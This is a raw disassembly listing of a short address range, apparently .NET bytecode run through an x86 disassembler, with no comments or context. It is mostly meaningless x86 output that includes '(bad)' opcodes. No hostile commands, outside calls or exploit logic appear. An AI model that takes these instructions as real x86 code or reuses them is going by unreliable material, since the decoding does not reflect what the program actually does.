  40261e:	00 fe                	add    %bh,%dh
  402620:	0c 09                	or     $0x9,%al
  402622:	00 8f 05 00 00 01    	add    %cl,0x1000005(%edi)
  402628:	e0 fe                	loopne 0x402628
  40262a:	0c 01                	or     $0x1,%al
  40262c:	00 fe                	add    %bh,%dh
  40262e:	0c 03                	or     $0x3,%al
  402630:	00 58 4a             	add    %bl,0x4a(%eax)
  402633:	54                   	push   %esp
  402634:	fe 0c 0e             	decb   (%esi,%ecx,1)
  402637:	00 fe                	add    %bh,%dh
  402639:	0c 09                	or     $0x9,%al
  40263b:	00 20                	add    %ah,(%eax)
  40263d:	00 00                	add    %al,(%eax)
  40263f:	00 00                	add    %al,(%eax)
  402641:	9c                   	pushf
  402642:	fe 0c 09             	decb   (%ecx,%ecx,1)
  402645:	00 20                	add    %ah,(%eax)
  402647:	01 00                	add    %eax,(%eax)
  402649:	00 00                	add    %al,(%eax)
  40264b:	58                   	pop    %eax
  40264c:	fe 0e                	decb   (%esi)
  40264e:	09 00                	or     %eax,(%eax)
  402650:	fe 0c 01             	decb   (%ecx,%eax,1)
  402653:	00 20                	add    %ah,(%eax)
  402655:	08 00                	or     %al,(%eax)
  402657:	00 00                	add    %al,(%eax)
  402659:	58                   	pop    %eax
  40265a:	fe 0e                	decb   (%esi)
  40265c:	01 00                	add    %eax,(%eax)
  40265e:	38 a2 fa ff ff fe    	cmp    %ah,-0x1000006(%edx)
  402664:	0c 08                	or     $0x8,%al
  402666:	00 fe                	add    %bh,%dh
  402668:	0c 09                	or     $0x9,%al
  40266a:	00 20                	add    %ah,(%eax)
  40266c:	01 00                	add    %eax,(%eax)
  40266e:	00 00                	add    %al,(%eax)
  402670:	59                   	pop    %ecx
  402671:	fe 0c 05 00 fe 0c 09 	decb   0x90cfe00(,%eax,1)
  402678:	00 20                	add    %ah,(%eax)
  40267a:	01 00                	add    %eax,(%eax)
  40267c:	00 00                	add    %al,(%eax)
  40267e:	59                   	pop    %ecx
  40267f:	8f 05 00 00 01 e0    	pop    0xe0010000
  402685:	4a                   	dec    %edx
  402686:	8d 03                	lea    (%ebx),%eax
  402688:	00 00                	add    %al,(%eax)
  40268a:	01 a2 fe 0c 0e 00    	add    %esp,0xe0cfe(%edx)
  402690:	fe 0c 09             	decb   (%ecx,%ecx,1)
  402693:	00 20                	add    %ah,(%eax)
  402695:	01 00                	add    %eax,(%eax)
  402697:	00 00                	add    %al,(%eax)
  402699:	59                   	pop    %ecx
  40269a:	20 05 00 00 00 9c    	and    %al,0x9c000000
  4026a0:	38 60 fa             	cmp    %ah,-0x6(%eax)
  4026a3:	ff                   	(bad)
  4026a4:	ff                   	(bad)
  4026a5:	fe 0c 02             	decb   (%edx,%eax,1)
  4026a8:	00 fe                	add    %bh,%dh
  4026aa:	0c 01                	or     $0x1,%al
  4026ac:	00 fe                	add    %bh,%dh
  4026ae:	0c 03                	or     $0x3,%al
  4026b0:	00 58 4a             	add    %bl,0x4a(%eax)
  4026b3:	fe 0c 08             	decb   (%eax,%ecx,1)
  4026b6:	00 fe                	add    %bh,%dh
  4026b8:	0c 09                	or     $0x9,%al
  4026ba:	00 20                	add    %ah,(%eax)
  4026bc:	01 00                	add    %eax,(%eax)
  4026be:	00 00                	add    %al,(%eax)
  4026c0:	59                   	pop    %ecx
  4026c1:	9a a2 fe 0c 01 00 20 	lcall  $0x2000,$0x10cfea2
  4026c8:	08 00                	or     %al,(%eax)
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	58                   	pop    %eax
  4026cd:	fe 0e                	decb   (%esi)
  4026cf:	01 00                	add    %eax,(%eax)
  4026d1:	fe 0c 09             	decb   (%ecx,%ecx,1)
  4026d4:	00 20                	add    %ah,(%eax)
  4026d6:	01 00                	add    %eax,(%eax)
  4026d8:	00 00                	add    %al,(%eax)
  4026da:	59                   	pop    %ecx
  4026db:	fe 0e                	decb   (%esi)
  4026dd:	09 00                	or     %eax,(%eax)
  4026df:	38 21                	cmp    %ah,(%ecx)
  4026e1:	fa                   	cli
  4026e2:	ff                   	(bad)
  4026e3:	ff                   	(bad)
  4026e4:	fe 0c 05 00 fe 0c 09 	decb   0x90cfe00(,%eax,1)
  4026eb:	00 20                	add    %ah,(%eax)
  4026ed:	01 00                	add    %eax,(%eax)
  4026ef:	00 00                	add    %al,(%eax)
  4026f1:	59                   	pop    %ecx
  4026f2:	8f 05 00 00 01 e0    	pop    0xe0010000
  4026f8:	4a                   	dec    %edx
  4026f9:	80 01 00             	addb   $0x0,(%ecx)
  4026fc:	00 04 fe             	add    %al,(%esi,%edi,8)
  4026ff:	0c 09                	or     $0x9,%al
  402701:	00 20                	add    %ah,(%eax)
  402703:	01 00                	add    %eax,(%eax)
  402705:	00 00                	add    %al,(%eax)
  402707:	59                   	pop    %ecx
  402708:	fe 0e                	decb   (%esi)
  40270a:	09 00                	or     %eax,(%eax)
  40270c:	38 f4                	cmp    %dh,%ah
  40270e:	f9                   	stc
  40270f:	ff                   	(bad)
  402710:	ff                   	(bad)
  402711:	fe 0c 05 00 fe 0c 09 	decb   0x90cfe00(,%eax,1)
  402718:	00 8f 05 00 00 01    	add    %cl,0x1000005(%edi)
  40271e:	e0 fe                	loopne 0x40271e
  402720:	0c 01                	or     $0x1,%al
  402722:	00 fe                	add    %bh,%dh
  402724:	0c 04                	or     $0x4,%al
  402726:	00 58 4c             	add    %bl,0x4c(%eax)
  402729:	55                   	push   %ebp
  40272a:	fe 0c 0e             	decb   (%esi,%ecx,1)
  40272d:	00 fe                	add    %bh,%dh
  40272f:	0c 09                	or     $0x9,%al
  402731:	00 20                	add    %ah,(%eax)
  402733:	01 00                	add    %eax,(%eax)
  402735:	00 00                	add    %al,(%eax)
  402737:	9c                   	pushf
  402738:	fe 0c 09             	decb   (%ecx,%ecx,1)
  40273b:	00 20                	add    %ah,(%eax)
  40273d:	01 00                	add    %eax,(%eax)
  40273f:	00 00                	add    %al,(%eax)
  402741:	58                   	pop    %eax
  402742:	fe 0e                	decb   (%esi)
  402744:	09 00                	or     %eax,(%eax)
  402746:	fe 0c 01             	decb   (%ecx,%eax,1)
  402749:	00 20                	add    %ah,(%eax)
  40274b:	10 00                	adc    %al,(%eax)
  40274d:	00 00                	add    %al,(%eax)
  40274f:	58                   	pop    %eax
  402750:	fe 0e                	decb   (%esi)
  402752:	01 00                	add    %eax,(%eax)
  402754:	38 ac f9 ff ff fe 0c 	cmp    %ch,0xcfeffff(%ecx,%edi,8)
  40275b:	0e                   	push   %cs
  40275c:	00 fe                	add    %bh,%dh
  40275e:	0c 09                	or     $0x9,%al
  402760:	00 20                	add    %ah,(%eax)
  402762:	04 00                	add    $0x0,%al
  402764:	00 00                	add    %al,(%eax)
  402766:	9c                   	pushf
  402767:	fe 0c 08             	decb   (%eax,%ecx,1)
  40276a:	00 fe                	add    %bh,%dh
  40276c:	0c 09                	or     $0x9,%al
  40276e:	00 7e 03             	add    %bh,0x3(%esi)
  402771:	00 00                	add    %al,(%eax)
  402773:	04 fe                	add    $0xfe,%al
  402775:	0c 01                	or     $0x1,%al
  402777:	00 fe                	add    %bh,%dh
  402779:	0c 03                	or     $0x3,%al
  40277b:	00 58 4a             	add    %bl,0x4a(%eax)
  40277e:	97                   	xchg   %eax,%edi
  40277f:	29 02                	sub    %eax,(%edx)
  402781:	00 00                	add    %al,(%eax)
  402783:	11 8c 01 00 00 01 a2 	adc    %ecx,-0x5dff0000(%ecx,%eax,1)
  40278a:	fe 0c 09             	decb   (%ecx,%ecx,1)
  40278d:	00 20                	add    %ah,(%eax)
  40278f:	01 00                	add    %eax,(%eax)
  402791:	00 00                	add    %al,(%eax)
  402793:	58                   	pop    %eax
  402794:	fe 0e                	decb   (%esi)
  402796:	09 00                	or     %eax,(%eax)
  402798:	fe 0c 01             	decb   (%ecx,%eax,1)
  40279b:	00 20                	add    %ah,(%eax)
  40279d:	08 00                	or     %al,(%eax)
  40279f:	00 00                	add    %al,(%eax)
  4027a1:	58                   	pop    %eax
  4027a2:	fe 0e                	decb   (%esi)
  4027a4:	01 00                	add    %eax,(%eax)
  4027a6:	38 5a f9             	cmp    %bl,-0x7(%edx)
  4027a9:	ff                   	(bad)
  4027aa:	ff                   	(bad)
  4027ab:	fe 0c 02             	decb   (%edx,%eax,1)
  4027ae:	00 fe                	add    %bh,%dh
  4027b0:	0c 01                	or     $0x1,%al
  4027b2:	00 fe                	add    %bh,%dh
  4027b4:	0c 03                	or     $0x3,%al
  4027b6:	00 58 4a             	add    %bl,0x4a(%eax)
  4027b9:	fe 0c 08             	decb   (%eax,%ecx,1)
  4027bc:	00 fe                	add    %bh,%dh
  4027be:	0c 09                	or     $0x9,%al
  4027c0:	00 20                	add    %ah,(%eax)
  4027c2:	01 00                	add    %eax,(%eax)
  4027c4:	00 00                	add    %al,(%eax)
  4027c6:	59                   	pop    %ecx
  4027c7:	9a a5 01 00 00 01 8c 	lcall  $0x8c01,$0x1a5
  4027ce:	01 00                	add    %eax,(%eax)
  4027d0:	00 01                	add    %al,(%ecx)
  4027d2:	a2 fe 0c 01 00       	mov    %al,0x10cfe
  4027d7:	20 08                	and    %cl,(%eax)
  4027d9:	00 00                	add    %al,(%eax)
  4027db:	00 58 fe             	add    %bl,-0x2(%eax)
  4027de:	0e                   	push   %cs
  4027df:	01 00                	add    %eax,(%eax)
  4027e1:	fe 0c 09             	decb   (%ecx,%ecx,1)
  4027e4:	00 20                	add    %ah,(%eax)
  4027e6:	01 00                	add    %eax,(%eax)
  4027e8:	00 00                	add    %al,(%eax)
  4027ea:	59                   	pop    %ecx
  4027eb:	fe 0e                	decb   (%esi)
  4027ed:	09 00                	or     %eax,(%eax)
  4027ef:	38 11                	cmp    %dl,(%ecx)
  4027f1:	f9                   	stc
  4027f2:	ff                   	(bad)
  4027f3:	ff                   	(bad)
  4027f4:	fe 0c 0e             	decb   (%esi,%ecx,1)
  4027f7:	00 fe                	add    %bh,%dh
  4027f9:	0c 09                	or     $0x9,%al
  4027fb:	00 20                	add    %ah,(%eax)
  4027fd:	0d 00 00 00 9c       	or     $0x9c000000,%eax
  402802:	fe 0c 05 00 fe 0c 09 	decb   0x90cfe00(,%eax,1)
  402809:	00 8f 05 00 00 01    	add    %cl,0x1000005(%edi)
  40280f:	e0 fe                	loopne 0x40280f
  402811:	0c 01                	or     $0x1,%al
  402813:	00 fe                	add    %bh,%dh
  402815:	0c 03                	or     $0x3,%al
  402817:	00 58 4a             	add    %bl,0x4a(%eax)
  40281a:	54                   	push   %esp
  40281b:	fe 0c 00             	decb   (%eax,%eax,1)
  40281e:	00 fe                	add    %bh,%dh
  402820:	0c 09                	or     $0x9,%al
  402822:	00 20                	add    %ah,(%eax)
  402824:	00 00                	add    %al,(%eax)
  402826:	00 00                	add    %al,(%eax)
  402828:	59                   	pop    %ecx
  402829:	fe 0c 01             	decb   (%ecx,%eax,1)
  40282c:	00 20                	add    %ah,(%eax)
  40282e:	08 00                	or     %al,(%eax)
  402830:	00 00                	add    %al,(%eax)
  402832:	58                   	pop    %eax
  402833:	fe 0c 03             	decb   (%ebx,%eax,1)
  402836:	00 58 4a             	add    %bl,0x4a(%eax)
  402839:	9e                   	sahf
  40283a:	fe 0c 09             	decb   (%ecx,%ecx,1)
  40283d:	00 20                	add    %ah,(%eax)
  40283f:	01 00                	add    %eax,(%eax)
  402841:	00 00                	add    %al,(%eax)
  402843:	58                   	pop    %eax
  402844:	fe 0e                	decb   (%esi)
  402846:	09 00                	or     %eax,(%eax)
  402848:	fe 0c 01             	decb   (%ecx,%eax,1)
  40284b:	00 20                	add    %ah,(%eax)
  40284d:	10 00                	adc    %al,(%eax)
  40284f:	00 00                	add    %al,(%eax)
  402851:	58                   	pop    %eax
  402852:	fe 0e                	decb   (%esi)
  402854:	01 00                	add    %eax,(%eax)
  402856:	38 aa f8 ff ff fe    	cmp    %ch,-0x1000008(%edx)
  40285c:	0c 0e                	or     $0xe,%al
  40285e:	00 fe                	add    %bh,%dh
  402860:	0c 09                	or     $0x9,%al
  402862:	00 20                	add    %ah,(%eax)
  402864:	01 00                	add    %eax,(%eax)
  402866:	00 00                	add    %al,(%eax)
  402868:	59                   	pop    %ecx
  402869:	20 01                	and    %al,(%ecx)
  40286b:	00 00                	add    %al,(%eax)
  40286d:	00 9c fe 0c 05 00 fe 	add    %bl,-0x1fffaf4(%esi,%edi,8)
  402874:	0c 09                	or     $0x9,%al
  402876:	00 20                	add    %ah,(%eax)
  402878:	01 00                	add    %eax,(%eax)
  40287a:	00 00                	add    %al,(%eax)
  40287c:	59                   	pop    %ecx
  40287d:	8f 05 00 00 01 e0    	pop    0xe0010000
  402883:	fe 0c 08             	decb   (%eax,%ecx,1)
  402886:	00 fe                	add    %bh,%dh
  402888:	0c 09                	or     $0x9,%al
  40288a:	00 20                	add    %ah,(%eax)
  40288c:	01 00                	add    %eax,(%eax)
  40288e:	00 00                	add    %al,(%eax)
  402890:	59                   	pop    %ecx
  402891:	9a fe 0c 05 00 fe 0c 	lcall  $0xcfe,$0x50cfe
  402898:	09 00                	or     %eax,(%eax)
  40289a:	20 01                	and    %al,(%ecx)
  40289c:	00 00                	add    %al,(%eax)
  40289e:	00 59 8f             	add    %bl,-0x71(%ecx)
  4028a1:	05 00 00 01 e0       	add    $0xe0010000,%eax
  4028a6:	4a                   	dec    %edx
  4028a7:	fe 0c 02             	decb   (%edx,%eax,1)
  4028aa:	00 7e 03             	add    %bh,0x3(%esi)
  4028ad:	00 00                	add    %al,(%eax)
  4028af:	04 fe                	add    $0xfe,%al
  4028b1:	0c 00                	or     $0x0,%al
  4028b3:	00 fe                	add    %bh,%dh
  4028b5:	0c 09                	or     $0x9,%al
  4028b7:	00 20                	add    %ah,(%eax)
  4028b9:	01 00                	add    %eax,(%eax)
  4028bb:	00 00                	add    %al,(%eax)
  4028bd:	59                   	pop    %ecx
  4028be:	94                   	xchg   %eax,%esp
  4028bf:	97                   	xchg   %eax,%edi
  4028c0:	29 03                	sub    %eax,(%ebx)
  4028c2:	00 00                	add    %al,(%eax)
  4028c4:	11 7e 03             	adc    %edi,0x3(%esi)
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	04 fe                	add    $0xfe,%al
  4028cb:	0c 01                	or     $0x1,%al
  4028cd:	00 fe                	add    %bh,%dh
  4028cf:	0c 03                	or     $0x3,%al
  4028d1:	00 58 4a             	add    %bl,0x4a(%eax)
  4028d4:	97                   	xchg   %eax,%edi
  4028d5:	29 04 00             	sub    %eax,(%eax,%eax,1)
  4028d8:	00 11                	add    %dl,(%ecx)
  4028da:	55                   	push   %ebp
  4028db:	fe 0c 01             	decb   (%ecx,%eax,1)
  4028de:	00 20                	add    %ah,(%eax)
  4028e0:	08 00                	or     %al,(%eax)
  4028e2:	00 00                	add    %al,(%eax)
  4028e4:	58                   	pop    %eax
  4028e5:	fe 0e                	decb   (%esi)
  4028e7:	01 00                	add    %eax,(%eax)
  4028e9:	38 17                	cmp    %dl,(%edi)
  4028eb:	f8                   	clc
  4028ec:	ff                   	(bad)
  4028ed:	ff                   	(bad)
  4028ee:	fe 0c 05 00 fe 0c 09 	decb   0x90cfe00(,%eax,1)
  4028f5:	00 20                	add    %ah,(%eax)
  4028f7:	02 00                	add    (%eax),%al
  4028f9:	00 00                	add    %al,(%eax)
  4028fb:	59                   	pop    %ecx
  4028fc:	8f 05 00 00 01 e0    	pop    0xe0010000
  402902:	4c                   	dec    %esp
  402903:	fe 0c 05 00 fe 0c 09 	decb   0x90cfe00(,%eax,1)
  40290a:	00 20                	add    %ah,(%eax)
  40290c:	01 00                	add    %eax,(%eax)
  40290e:	00 00                	add    %al,(%eax)
  402910:	59                   	pop    %ecx
  402911:	8f 05 00 00 01 e0    	pop    0xe0010000
  402917:	4c                   	dec    %esp
  402918:	fe 02                	incb   (%edx)
  40291a:	fe 0c 01             	decb   (%ecx,%eax,1)
  40291d:	00 fe                	add    %bh,%dh
  40291f:	0c 03                	or     $0x3,%al
  402921:	00 58 4a             	add    %bl,0x4a(%eax)
  402924:	fe 0c 01             	decb   (%ecx,%eax,1)
  402927:	00 20                	add    %ah,(%eax)
  402929:	08 00                	or     %al,(%eax)
  40292b:	00 00                	add    %al,(%eax)
  40292d:	58                   	pop    %eax
  40292e:	fe 0c 03             	decb   (%ebx,%eax,1)
  402931:	00 58 4a             	add    %bl,0x4a(%eax)
  402934:	59                   	pop    %ecx
  402935:	5a                   	pop    %edx
  402936:	fe 0c 01             	decb   (%ecx,%eax,1)
  402939:	00 20                	add    %ah,(%eax)
  40293b:	08 00                	or     %al,(%eax)
  40293d:	00 00                	add    %al,(%eax)
  40293f:	58                   	pop    %eax
  402940:	fe 0c 03             	decb   (%ebx,%eax,1)
  402943:	00 58 4a             	add    %bl,0x4a(%eax)
  402946:	58                   	pop    %eax
  402947:	fe 0c 06             	decb   (%esi,%eax,1)
  40294a:	00 58 fe             	add    %bl,-0x2(%eax)
  40294d:	0e                   	push   %cs
  40294e:	01 00                	add    %eax,(%eax)
  402950:	fe 0c 09             	decb   (%ecx,%ecx,1)
  402953:	00 20                	add    %ah,(%eax)
  402955:	02 00                	add    (%eax),%al
  402957:	00 00                	add    %al,(%eax)
  402959:	59                   	pop    %ecx
  40295a:	fe 0e                	decb   (%esi)
  40295c:	09 00                	or     %eax,(%eax)
  40295e:	38 a2 f7 ff ff fe    	cmp    %ah,-0x1000009(%edx)
  402964:	0c 08                	or     $0x8,%al
  402966:	00 fe                	add    %bh,%dh
  402968:	0c 09                	or     $0x9,%al
  40296a:	00 20                	add    %ah,(%eax)
  40296c:	01 00                	add    %eax,(%eax)
  40296e:	00 00                	add    %al,(%eax)
  402970:	59                   	pop    %ecx
  402971:	fe 0c 05 00 fe 0c 09 	decb   0x90cfe00(,%eax,1)
  402978:	00 20                	add    %ah,(%eax)
  40297a:	01 00                	add    %eax,(%eax)
  40297c:	00 00                	add    %al,(%eax)
  40297e:	59                   	pop    %ecx
  40297f:	8f 05 00 00 01 e0    	pop    0xe0010000
  402985:	4a                   	dec    %edx
  402986:	8d 06                	lea    (%esi),%eax
  402988:	00 00                	add    %al,(%eax)
  40298a:	01 a2 fe 0c 0e 00    	add    %esp,0xe0cfe(%edx)
  402990:	fe 0c 09             	decb   (%ecx,%ecx,1)
  402993:	00 20                	add    %ah,(%eax)
  402995:	01 00                	add    %eax,(%eax)
  402997:	00 00                	add    %al,(%eax)
  402999:	59                   	pop    %ecx
  40299a:	20 05 00 00 00 9c    	and    %al,0x9c000000
  4029a0:	38 60 f7             	cmp    %ah,-0x9(%eax)
  4029a3:	ff                   	(bad)
  4029a4:	ff                   	(bad)
  4029a5:	fe 0c 0e             	decb   (%esi,%ecx,1)
  4029a8:	00 fe                	add    %bh,%dh
  4029aa:	0c 09                	or     $0x9,%al
  4029ac:	00 fe                	add    %bh,%dh
  4029ae:	0c 0e                	or     $0xe,%al
  4029b0:	00 fe                	add    %bh,%dh
  4029b2:	0c 09                	or     $0x9,%al
  4029b4:	00 20                	add    %ah,(%eax)
  4029b6:	01 00                	add    %eax,(%eax)
  4029b8:	00 00                	add    %al,(%eax)
  4029ba:	59                   	pop    %ecx
  4029bb:	90                   	nop
  4029bc:	9c                   	pushf
  4029bd:	fe 0c 00             	decb   (%eax,%eax,1)
  4029c0:	00 fe                	add    %bh,%dh
  4029c2:	0c 09                	or     $0x9,%al
  4029c4:	00 20                	add    %ah,(%eax)
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	00 00                	add    %al,(%eax)
  4029ca:	59                   	pop    %ecx
  4029cb:	fe 0c 00             	decb   (%eax,%eax,1)
  4029ce:	00 fe                	add    %bh,%dh
  4029d0:	0c 09                	or     $0x9,%al
  4029d2:	00 20                	add    %ah,(%eax)
  4029d4:	01 00                	add    %eax,(%eax)
  4029d6:	00 00                	add    %al,(%eax)
  4029d8:	59                   	pop    %ecx
  4029d9:	94                   	xchg   %eax,%esp
  4029da:	9e                   	sahf
  4029db:	fe 0c 05 00 fe 0c 09 	decb   0x90cfe00(,%eax,1)
  4029e2:	00 8f 05 00 00 01    	add    %cl,0x1000005(%edi)
  4029e8:	e0 fe                	loopne 0x4029e8
  4029ea:	0c 05                	or     $0x5,%al
  4029ec:	00 fe                	add    %bh,%dh
  4029ee:	0c 09                	or     $0x9,%al
  4029f0:	00 20                	add    %ah,(%eax)
  4029f2:	01 00                	add    %eax,(%eax)
  4029f4:	00 00                	add    %al,(%eax)
  4029f6:	59                   	pop    %ecx
  4029f7:	8f 05 00 00 01 e0    	pop    0xe0010000
  4029fd:	4c                   	dec    %esp
  4029fe:	55                   	push   %ebp
  4029ff:	fe 0c 08             	decb   (%eax,%ecx,1)
  402a02:	00 fe                	add    %bh,%dh
  402a04:	0c 09                	or     $0x9,%al
  402a06:	00 fe                	add    %bh,%dh
  402a08:	0c 08                	or     $0x8,%al
  402a0a:	00 fe                	add    %bh,%dh
  402a0c:	0c 09                	or     $0x9,%al
  402a0e:	00 20                	add    %ah,(%eax)
  402a10:	01 00                	add    %eax,(%eax)
  402a12:	00 00                	add    %al,(%eax)
  402a14:	59                   	pop    %ecx
  402a15:	9a a2 fe 0c 09 00 20 	lcall  $0x2000,$0x90cfea2
  402a1c:	01 00                	add    %eax,(%eax)
  402a1e:	00 00                	add    %al,(%eax)
  402a20:	58                   	pop    %eax
  402a21:	fe 0e                	decb   (%esi)
  402a23:	09 00                	or     %eax,(%eax)
  402a25:	38 db                	cmp    %bl,%bl
  402a27:	f6 ff                	idiv   %bh
  402a29:	ff                   	(bad)
  402a2a:	fe 0c 02             	decb   (%edx,%eax,1)
  402a2d:	00 fe                	add    %bh,%dh
  402a2f:	0c 01                	or     $0x1,%al
  402a31:	00 fe                	add    %bh,%dh
  402a33:	0c 03                	or     $0x3,%al
  402a35:	00 58 4a             	add    %bl,0x4a(%eax)
  402a38:	fe 0c 08             	decb   (%eax,%ecx,1)
  402a3b:	00 fe                	add    %bh,%dh
  402a3d:	0c 09                	or     $0x9,%al
  402a3f:	00 20                	add    %ah,(%eax)
  402a41:	01 00                	add    %eax,(%eax)
  402a43:	00 00                	add    %al,(%eax)
  402a45:	59                   	pop    %ecx
  402a46:	9a a2 fe 0c 01 00 20 	lcall  $0x2000,$0x10cfea2
  402a4d:	08 00                	or     %al,(%eax)
  402a4f:	00 00                	add    %al,(%eax)
  402a51:	58                   	pop    %eax
  402a52:	fe 0e                	decb   (%esi)
  402a54:	01 00                	add    %eax,(%eax)
  402a56:	fe 0c 09             	decb   (%ecx,%ecx,1)
  402a59:	00 20                	add    %ah,(%eax)
  402a5b:	01 00                	add    %eax,(%eax)
  402a5d:	00 00                	add    %al,(%eax)
  402a5f:	59                   	pop    %ecx
  402a60:	fe 0e                	decb   (%esi)
  402a62:	09 00                	or     %eax,(%eax)
  402a64:	38 9c f6 ff ff fe 0c 	cmp    %bl,0xcfeffff(%esi,%esi,8)
  402a6b:	0e                   	push   %cs
  402a6c:	00 fe                	add    %bh,%dh
  402a6e:	0c 09                	or     $0x9,%al
  402a70:	00 20                	add    %ah,(%eax)
  402a72:	05 00 00 00 9c       	add    $0x9c000000,%eax
  402a77:	fe 0c 08             	decb   (%eax,%ecx,1)
  402a7a:	00 fe                	add    %bh,%dh
  402a7c:	0c 09                	or     $0x9,%al
  402a7e:	00 fe                	add    %bh,%dh
  402a80:	0c 02                	or     $0x2,%al
  402a82:	00 fe                	add    %bh,%dh
  402a84:	0c 01                	or     $0x1,%al
  402a86:	00 fe                	add    %bh,%dh
  402a88:	0c 03                	or     $0x3,%al
  402a8a:	00 58 4a             	add    %bl,0x4a(%eax)
  402a8d:	9a a2 fe 0c 09 00 20 	lcall  $0x2000,$0x90cfea2
  402a94:	01 00                	add    %eax,(%eax)
  402a96:	00 00                	add    %al,(%eax)
  402a98:	58                   	pop    %eax
  402a99:	fe 0e                	decb   (%esi)
  402a9b:	09 00                	or     %eax,(%eax)
  402a9d:	fe 0c 01             	decb   (%ecx,%eax,1)
  402aa0:	00 20                	add    %ah,(%eax)
  402aa2:	08 00                	or     %al,(%eax)
  402aa4:	00 00                	add    %al,(%eax)
  402aa6:	58                   	pop    %eax
  402aa7:	fe 0e                	decb   (%esi)
  402aa9:	01 00                	add    %eax,(%eax)
  402aab:	38 55 f6             	cmp    %dl,-0xa(%ebp)
  402aae:	ff                   	(bad)
  402aaf:	ff                   	(bad)
  402ab0:	fe 0c 0e             	decb   (%esi,%ecx,1)
  402ab3:	00 fe                	add    %bh,%dh
  402ab5:	0c 09                	or     $0x9,%al
  402ab7:	00 20                	add    %ah,(%eax)
  402ab9:	05 00 00 00 9c       	add    $0x9c000000,%eax
  402abe:	fe 0c 08             	decb   (%eax,%ecx,1)
  402ac1:	00 fe                	add    %bh,%dh
  402ac3:	0c 09                	or     $0x9,%al
  402ac5:	00 fe                	add    %bh,%dh
  402ac7:	0c 02                	or     $0x2,%al
  402ac9:	00 fe                	add    %bh,%dh
  402acb:	0c 01                	or     $0x1,%al
  402acd:	00 fe                	add    %bh,%dh
  402acf:	0c 03                	or     $0x3,%al
  402ad1:	00 58 4a             	add    %bl,0x4a(%eax)
  402ad4:	9a a2 fe 0c 09 00 20 	lcall  $0x2000,$0x90cfea2
  402adb:	01 00                	add    %eax,(%eax)
  402add:	00 00                	add    %al,(%eax)
  402adf:	58                   	pop    %eax
  402ae0:	fe 0e                	decb   (%esi)
  402ae2:	09 00                	or     %eax,(%eax)
  402ae4:	fe 0c 01             	decb   (%ecx,%eax,1)
  402ae7:	00 20                	add    %ah,(%eax)
  402ae9:	08 00                	or     %al,(%eax)
  402aeb:	00 00                	add    %al,(%eax)
  402aed:	58                   	pop    %eax
  402aee:	fe 0e                	decb   (%esi)
  402af0:	01 00                	add    %eax,(%eax)
  402af2:	38 0e                	cmp    %cl,(%esi)
  402af4:	f6 ff                	idiv   %bh
  402af6:	ff                   	(bad)
  402af7:	fe 0c 08             	decb   (%eax,%ecx,1)
  402afa:	00 fe                	add    %bh,%dh
  402afc:	0c 09                	or     $0x9,%al
  402afe:	00 20                	add    %ah,(%eax)
  402b00:	03 00                	add    (%eax),%eax
  402b02:	00 00                	add    %al,(%eax)
  402b04:	59                   	pop    %ecx
  402b05:	9a 74 01 00 00 1b fe 	lcall  $0xfe1b,$0x174
  402b0c:	0c 05                	or     $0x5,%al
  402b0e:	00 fe                	add    %bh,%dh
  402b10:	0c 09                	or     $0x9,%al
  402b12:	00 20                	add    %ah,(%eax)
  402b14:	02 00                	add    (%eax),%al
  402b16:	00 00                	add    %al,(%eax)
  402b18:	59                   	pop    %ecx
  402b19:	8f 05 00 00 01 e0    	pop    0xe0010000
  402b1f:	4a                   	dec    %edx
  402b20:	fe 0c 08             	decb   (%eax,%ecx,1)
  402b23:	00 fe                	add    %bh,%dh
  402b25:	0c 09                	or     $0x9,%al
  402b27:	00 20                	add    %ah,(%eax)
  402b29:	01 00                	add    %eax,(%eax)
  402b2b:	00 00                	add    %al,(%eax)
  402b2d:	59                   	pop    %ecx
  402b2e:	9a a2 fe 0c 09 00 20 	lcall  $0x2000,$0x90cfea2
  402b35:	03 00                	add    (%eax),%eax
  402b37:	00 00                	add    %al,(%eax)
  402b39:	59                   	pop    %ecx
  402b3a:	fe 0e                	decb   (%esi)
  402b3c:	09 00                	or     %eax,(%eax)
  402b3e:	38 c2                	cmp    %al,%dl
  402b40:	f5                   	cmc
  402b41:	ff                   	(bad)
  402b42:	ff                   	(bad)
  402b43:	fe 0c 08             	decb   (%eax,%ecx,1)
  402b46:	00 fe                	add    %bh,%dh
  402b48:	0c 09                	or     $0x9,%al
  402b4a:	00 20                	add    %ah,(%eax)
  402b4c:	02 00                	add    (%eax),%al
  402b4e:	00 00                	add    %al,(%eax)
  402b50:	59                   	pop    %ecx
  402b51:	fe 0c 08             	decb   (%eax,%ecx,1)
  402b54:	00 fe                	add    %bh,%dh
  402b56:	0c 09                	or     $0x9,%al
  402b58:	00 20                	add    %ah,(%eax)
  402b5a:	02 00                	add    (%eax),%al
  402b5c:	00 00                	add    %al,(%eax)
  402b5e:	59                   	pop    %ecx
  402b5f:	9a 74 01 00 00 1b fe 	lcall  $0xfe1b,$0x174
  402b66:	0c 05                	or     $0x5,%al
  402b68:	00 fe                	add    %bh,%dh
  402b6a:	0c 09                	or     $0x9,%al
  402b6c:	00 20                	add    %ah,(%eax)
  402b6e:	01 00                	add    %eax,(%eax)
  402b70:	00 00                	add    %al,(%eax)
  402b72:	59                   	pop    %ecx
  402b73:	8f 05 00 00 01 e0    	pop    0xe0010000
  402b79:	4a                   	dec    %edx
  402b7a:	9a a2 fe 0c 0e 00 fe 	lcall  $0xfe00,$0xe0cfea2
  402b81:	0c 09                	or     $0x9,%al
  402b83:	00 20                	add    %ah,(%eax)
  402b85:	02 00                	add    (%eax),%al
  402b87:	00 00                	add    %al,(%eax)
  402b89:	59                   	pop    %ecx
  402b8a:	20 05 00 00 00 9c    	and    %al,0x9c000000
  402b90:	fe 0c 09             	decb   (%ecx,%ecx,1)
  402b93:	00 20                	add    %ah,(%eax)
  402b95:	01 00                	add    %eax,(%eax)
  402b97:	00 00                	add    %al,(%eax)
  402b99:	59                   	pop    %ecx
  402b9a:	fe 0e                	decb   (%esi)
  402b9c:	09 00                	or     %eax,(%eax)
  402b9e:	38 62 f5             	cmp    %ah,-0xb(%edx)
  402ba1:	ff                   	(bad)
  402ba2:	ff                   	(bad)
  402ba3:	fe 0c 05 00 fe 0c 09 	decb   0x90cfe00(,%eax,1)
  402baa:	00 20                	add    %ah,(%eax)
  402bac:	02 00                	add    (%eax),%al
  402bae:	00 00                	add    %al,(%eax)
  402bb0:	59                   	pop    %ecx
  402bb1:	8f 05 00 00 01 e0    	pop    0xe0010000
